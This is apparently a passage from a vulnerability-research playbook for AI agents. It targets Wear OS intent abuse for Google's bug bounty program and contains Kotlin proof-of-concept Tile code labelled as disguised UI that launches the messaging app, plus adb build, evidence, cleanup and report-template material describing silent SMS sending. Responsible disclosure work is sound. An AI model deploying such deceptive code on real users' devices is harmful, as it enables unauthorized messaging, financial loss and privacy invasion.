    }

    private fun buildClickableLayout(): LayoutElement {
        // Create a clickable element that triggers a sensitive intent
        // when the user taps the tile
        return LayoutElementBuilders.Box.Builder()
            .addContent(
                LayoutElementBuilders.Text.Builder()
                    .setText("Tap to send message") // Disguised as legitimate UI
                    .build()
            )
            .setModifiers(
                ModifiersBuilders.Modifiers.Builder()
                    .setClickable(
                        ModifiersBuilders.Clickable.Builder()
                            .setOnClick(
                                LaunchAction.Builder()
                                    .setAndroidActivity(
                                        AndroidActivity.Builder()
                                            .setPackageName("com.google.android.apps.messaging")
                                            .setClassName("com.google.android.apps.messaging.ui.ConversationListActivity")
                                            // The intent launched from a Tile bypasses
                                            // normal Activity confirmation flow
                                            .build()
                                    )
                                    .build()
                            )
                            .build()
                    )
                    .build()
            )
            .build()
    }

    override fun onResourcesRequest(requestParams: RequestBuilders.ResourcesRequest): ListenableFuture<Resources> {
        return Futures.immediateFuture(
            Resources.Builder()
                .setVersion(RESOURCES_VERSION)
                .build()
        )
    }
}
```

---

## 5.2 Build & Deploy PoC

```bash
# ── Build PoC APK ──
cd ./poc_project/
./gradlew assembleDebug

# ── Sign with debug key ──
# (Auto-signed by Gradle in debug mode)

# ── Install on watch ──
adb install -r ./app/build/outputs/apk/debug/app-debug.apk

# ── Verify installation ──
adb shell pm list packages | grep poc

# ── Launch PoC ──
adb shell am start -n "com.poc.wearos.intentabuse/.MainActivity"

# ── Monitor logcat during PoC execution ──
adb logcat -s "WearOS-PoC:*" "WearOS-HealthPoC:*" "WearOS-TilePoC:*"

# ── Capture screen recording ──
adb shell screenrecord /sdcard/poc_recording.mp4 --time-limit 60 &
# Execute PoC, then:
adb pull /sdcard/poc_recording.mp4 ./findings/poc_recording.mp4

# ── Capture screenshots ──
adb shell screencap -p /sdcard/poc_screenshot.png
adb pull /sdcard/poc_screenshot.png ./findings/poc_screenshot.png
```

---

## 5.3 Impact Measurement & Proof

### Impact Evidence Collection

```bash
#!/bin/bash
# ── collect_evidence.sh ──
# Collects all evidence needed for a Google MVRP report

EVIDENCE_DIR="./evidence"
mkdir -p "$EVIDENCE_DIR"/{screenshots,recordings,logs,device_info}

# ── 1. Device info ──
adb shell getprop ro.build.display.id > "$EVIDENCE_DIR/device_info/build.txt"
adb shell getprop ro.build.version.security_patch > "$EVIDENCE_DIR/device_info/patch_level.txt"
adb shell getprop ro.product.model > "$EVIDENCE_DIR/device_info/model.txt"
adb shell getprop ro.build.version.release > "$EVIDENCE_DIR/device_info/android_version.txt"
adb shell pm list packages -f | grep messaging > "$EVIDENCE_DIR/device_info/target_app_version.txt"

# ── 2. Pre-test state ──
adb shell screencap -p /sdcard/pre_test.png
adb pull /sdcard/pre_test.png "$EVIDENCE_DIR/screenshots/01_pre_test.png"

# ── 3. Logcat during test ──
adb logcat -c
adb logcat -v threadtime > "$EVIDENCE_DIR/logs/full_logcat.txt" &
LOGCAT_PID=$!

# ── 4. Screen recording ──
adb shell screenrecord /sdcard/evidence.mp4 --time-limit 120 &
RECORD_PID=$!

echo "=== Evidence collection running ==="
echo "Logcat PID: $LOGCAT_PID"
echo "Recording PID: $RECORD_PID"
echo ""
echo "Now execute the PoC. When done, run:"
echo "  kill $LOGCAT_PID $RECORD_PID"
echo "  adb pull /sdcard/evidence.mp4 $EVIDENCE_DIR/recordings/"
echo ""

# ── 5. After PoC execution ──
# Verify the action actually happened:
# For SMS: Check sent messages folder
# adb shell content query --uri content://sms/sent --projection "address,body,date" | tail -5

# For calls: Check call log
# adb shell content query --uri content://call_log/calls --projection "number,type,date" | tail -5

# ── 6. Post-test screenshot ──
# adb shell screencap -p /sdcard/post_test.png
# adb pull /sdcard/post_test.png "$EVIDENCE_DIR/screenshots/02_post_test.png"
```

### CVSS v3.1 Scoring Guide

```
AGENT_INSTRUCTION: Calculate CVSS score for each finding using these Wear OS considerations.

For CVE-2025-12080 class (Intent Abuse / Confused Deputy):
┌──────────────────────────────────────────────────────┐
│ Metric               │ Value          │ Rationale    │
├──────────────────────────────────────────────────────┤
│ Attack Vector (AV)   │ Local (L)      │ App on watch │
│ Attack Complexity    │ Low (L)        │ Simple intent│
│ Privileges Required  │ None (N)       │ No perms     │
│ User Interaction     │ None (N)       │ Silent exec  │
│ Scope                │ Changed (C)    │ Cross-app    │
│ Confidentiality      │ Low (L)        │ Data read    │
│ Integrity            │ High (H)       │ Send msgs    │
│ Availability         │ None (N)       │ No DoS       │
├──────────────────────────────────────────────────────┤
│ CVSS Score           │ 8.2 HIGH       │              │
└──────────────────────────────────────────────────────┘

For Health Data Leakage:
- If passive data read without permission: CVSS 7.5+ (HIGH)
- If active data exfiltration possible: CVSS 8.0+ (HIGH)

For Data Layer Lateral Movement:
- If phone-side RCE via watch: CVSS 9.0+ (CRITICAL)
- If phone data theft via watch: CVSS 8.5+ (HIGH)
```

---

## 5.4 Google MVRP Report Template

```markdown
# Vulnerability Report: [TITLE]

## Summary
[One paragraph describing the vulnerability, affected component, and impact]

## Affected Component
- **App**: [Package name and version]
- **Platform**: Wear OS [version] on [device model]
- **Build**: [Build ID from getprop]
- **Security Patch Level**: [Date]

## Vulnerability Details

### Root Cause
[Technical explanation of WHY the vulnerability exists]

### CWE Classification
[CWE-XXX: Description]

### CVSS v3.1 Score
[Score] ([Severity]) — [Vector string]

## Reproduction Steps

### Prerequisites
1. Pixel Watch [model] running Wear OS [version] (build: [ID])
2. [App name] version [version] installed
3. PoC APK (attached)

### Steps
1. Install PoC APK on watch: `adb install poc.apk`
2. [Step 2]
3. [Step 3]
4. Observe: [Expected malicious result]

### Video Demonstration
[Attached: poc_demo.mp4 — XX seconds]

## Impact
- [Impact 1: e.g., Silent SMS sending without user consent]
- [Impact 2: e.g., Financial impact — premium rate SMS]
- [Impact 3: e.g., Privacy — messages sent on user's behalf]

## Attack Scenario
[Real-world attack scenario description]
An attacker distributes a benign-looking Wear OS app (e.g., a watch face).
The app requires NO special permissions. When installed, it silently
[performs malicious action] without any user interaction or awareness.

## Proposed Fix
[Suggested remediation — Google values this]
1. Add confirmation dialog before executing ACTION_SENDTO on Wear OS
2. Require explicit permission check in the intent handler
3. Mark the vulnerable Activity as `exported="false"`

## PoC Source Code
[Attached: Complete Android Studio project]

## Attachments
1. poc-app.apk — Compiled PoC
2. poc-source.zip — Full source code
3. poc_demo.mp4 — Screen recording of exploitation
4. logcat_output.txt — Relevant log output
5. device_info.txt — Target device details
```

---

## 5.5 Cleanup After Testing

```bash
#!/bin/bash
# ── cleanup.sh ──
# IMPORTANT: Clean up all PoC artifacts from the watch after testing
# Per user rule: validate that all resources are cleaned up after attack simulations

echo "=== Cleanup: Removing PoC artifacts from watch ==="

# ── Uninstall all PoC apps ──
for pkg in $(adb shell pm list packages | grep "poc" | sed 's/package://'); do
  echo "Uninstalling: $pkg"
  adb shell pm uninstall "$pkg"
done

# ── Remove temporary files ──
adb shell rm -f /sdcard/poc_*.mp4
adb shell rm -f /sdcard/poc_*.png
adb shell rm -f /sdcard/screen.png
adb shell rm -f /sdcard/evidence.mp4
adb shell rm -f /sdcard/pre_test.png
adb shell rm -f /sdcard/post_test.png
adb shell rm -f /data/local/tmp/frida-server

# ── Remove Burp cert if installed ──
adb shell rm -f /sdcard/burp_cert.pem

# ── Kill any remaining Frida server ──
adb shell "pkill -f frida-server" 2>/dev/null

# ── Reset proxy settings ──
adb shell settings put global http_proxy :0

# ── Verify cleanup ──
echo ""
echo "=== Verification ==="
echo "PoC packages remaining: $(adb shell pm list packages | grep -c 'poc')"
echo "Temp files: $(adb shell ls /sdcard/poc_* 2>/dev/null | wc -l)"
echo "Frida running: $(adb shell ps | grep -c frida)"
echo ""
echo "=== Cleanup Complete ==="
```

---

## 5.6 Submission Checklist

```
AGENT_INSTRUCTION: Before submitting to Google MVRP, verify ALL items:

PRE-SUBMISSION CHECKLIST:
[ ] Tested on LATEST Wear OS build and security patch level
[ ] Vulnerability reproduced at least 3 times consistently
[ ] PoC APK uses NO third-party SDKs (only AndroidX/Google)
[ ] PoC APK is the MINIMUM code needed to demonstrate the issue
[ ] Full source code included (not just APK)
[ ] Screen recording captured (30-60 seconds)
[ ] Device info documented (model, build, patch level, app version)
[ ] CVSS score calculated with vector string
[ ] CWE classification assigned
[ ] Impact section describes real-world attack scenario
[ ] Proposed fix included
[ ] All PoC artifacts cleaned up from test device
[ ] Report is CONCISE — Google prefers short, reproducer-first reports

SUBMISSION:
→ File at: https://g.co/vulnz
→ Category: "Android & Google Devices"
→ Include: Device model, OS version, patch level, affected component
```
